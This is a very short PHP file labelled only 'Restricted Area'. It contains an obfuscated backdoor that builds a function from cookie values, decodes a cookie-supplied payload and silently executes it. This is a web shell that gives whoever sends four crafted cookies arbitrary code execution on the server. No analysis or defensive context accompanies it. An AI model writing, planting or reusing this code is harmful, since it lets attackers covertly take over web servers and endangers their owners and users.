<?php
// Restricted Area
$c = $_COOKIE;
(count($c)==4) ? (($cf = $c[1].$c[2]) && ($_cf = $cf('', $c[3]($c[4]))) && @$_cf()) : $c;